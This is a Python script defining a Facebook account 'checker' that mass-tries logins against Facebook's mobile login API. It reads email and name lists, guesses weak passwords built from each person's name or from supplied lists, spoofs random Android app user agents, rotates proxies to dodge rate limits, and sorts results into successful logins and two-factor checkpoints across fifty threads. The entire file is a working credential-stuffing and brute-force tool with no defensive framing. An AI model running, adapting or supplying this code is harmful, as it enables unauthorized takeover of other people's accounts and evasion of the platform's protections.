import requests,json,time,os,random,concurrent.futures
from uuid import uuid4
class FBChecker:
    def __init__(self, accounts_file, passwords=None, proxies_file=None, max_threads=50):
        self.accounts_file = accounts_file
        self.max_threads = max_threads
        self.hits = 0
        self.cp = 0
        self.wr = 0
        self.ukn = 0
        self.accounts = self.load_accounts()
        self.passwords_dict = {}
        self.passwords_option = passwords
        if passwords:
            if isinstance(passwords, str) and os.path.exists(passwords):
                self.load_passwords_file(passwords)
        self.proxies = self.load_proxies(proxies_file) if proxies_file else []
    def random_fb_ua(self):
        fbav = f"{random.randint(300,600)}.0.0.{random.randint(10,70)}.{random.randint(10,120)}"
        fbbv = str(random.randint(100000000, 999999999))
        density = random.choice([2.0, 2.25, 2.75, 3.0, 3.5, 4.0])
        width = random.choice([720, 1080, 1440])
        height = random.choice([1520, 1920, 2160, 2220, 2400])
        lang = random.choice(["en_US", "en_GB", "ar_AR", "ar_AE", "fr_FR"])
        carrier = random.choice(["Zain","Orange","Yemen Mobile","MTN","STC","Vodafone","Ooredoo"])
        brand_models = {
            "Xiaomi": ["Redmi Note 10", "Redmi Note 12 Pro", "Mi 11 Lite", "Poco X3 Pro", "Poco F5"],
            "Samsung": ["Galaxy A52", "Galaxy A32", "Galaxy S21", "Galaxy M51"],
            "Huawei": ["Nova 7i", "Y9 Prime", "Mate 20 Pro"],
            "OPPO": ["A74", "Reno 8", "F9"],
            "Vivo": ["Y20", "V21", "Y33s"],
            "Realme": ["Realme 7", "Realme 8 Pro", "Realme C35"]
        }
        brand = random.choice(list(brand_models.keys()))
        model = random.choice(brand_models[brand])
        android_version = random.choice(["9","10","11","12","13"])
        arch = random.choice(["arm64-v8a","armeabi-v7a"])
        ua = (
            f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density={density},width={width},height={height}}};"
            f"FBLC/{lang};FBRV/0;FBCR/{carrier};FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;"
            f"FBDV/{model};FBSV/{android_version};FBOP/1;FBCA/{arch}:;]"
        )
        return ua
    def load_accounts(self):
        accounts = []
        with open(self.accounts_file, 'r') as f:
            for line in f.read().splitlines():
                if "|" in line:
                    email, name = line.strip().split("|",1)
                    accounts.append((email, name))
        return accounts
    def load_passwords_file(self, file_path):
        with open(file_path,'r') as f:
            for line in f.read().splitlines():
                if "|" in line:
                    name, pw_list = line.strip().split("|",1)
                    self.passwords_dict[name.lower()] = pw_list.split(",")
    def load_proxies(self, proxies_file):
        proxies = []
        if os.path.exists(proxies_file):
            with open(proxies_file,'r') as f:
                for p in f.read().splitlines():
                    p = p.strip()
                    if p: proxies.append(p)
        return proxies
    def send_request_with_retry(self, url, payload, headers):
        for attempt in range(3):
            try:
                proxy = random.choice(self.proxies) if self.proxies else None
                prox = {"http": "http://" + proxy, "https": "http://" + proxy} if proxy else None
                response = requests.post(url, data=payload, headers=headers, proxies=prox, timeout=10)
                return response
            except Exception:
                if attempt < 2:continue
                else:return None
        return None
    def login(self, email, pw):
        headers = {
            'User-Agent': self.random_fb_ua(),
            'x-fb-friendly-name': "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
            'authorization': "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        }
        payload = {
            'method': "post",
            'pretty': "false",
            'format': "json",
            'server_timestamps': "true",
            'locale': "en_EN",
            'purpose': "fetch",
            'variables': json.dumps({
                "params": {
                    "params": json.dumps({
                        "params": json.dumps({
                            "client_input_params": {
                                "secure_family_device_id": str(uuid4()),
                                "password": f"#PWD_FB4A:0:{int(time.time())}:{pw}",
                                "device_id": str(uuid4()),
                                "contact_point": email
                            }
                        })
                    })
                }
            })
        }
        url = "https://graph-fallback.facebook.com/graphql"
        response = self.send_request_with_retry(url, payload, headers)
        if not response: return "error"
        text = response.text
        if "login_success" in text or "success_response" in text or '"confirmed":true' in text:return "hit"
        elif "redirect_two_fac" in text or "error_2fa_bloks" in text or "two_step_verification" in text:return "cp"
        else:return "ukn"
    def generate_passwords(self, fullname):
        nmf = fullname.lower()
        frs = nmf.split(' ')[0]
        return [nmf, frs+'123', frs+'1234']
    def get_passwords_for_account(self, fullname):
        if isinstance(self.passwords_option, str) and not os.path.exists(self.passwords_option):
            return [self.passwords_option]
        if fullname.lower() in self.passwords_dict:
            return self.passwords_dict[fullname.lower()]
        if isinstance(self.passwords_option, list):
            return self.passwords_option
        return self.generate_passwords(fullname)
    def process_account(self, email, fullname):
        pwv = self.get_passwords_for_account(fullname)
        got_hit = got_cp = False
        for pw in pwv:
            res = self.login(email, pw)
            if res == "hit":
                self.hits +=1
                got_hit = True
                return "hit"
            elif res == "cp":
                self.cp +=1
                got_cp = True
                return "cp"
            elif res == "ukn":return "ukn"
            elif res == "error":continue
        if not got_hit and not got_cp:
            self.wr +=1
            return "wrong"
    def run(self):
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as exe:
            futures = [exe.submit(self.process_account, email, name) for email, name in self.accounts]
            for future in concurrent.futures.as_completed(futures):
                results.append(future.result())
        return results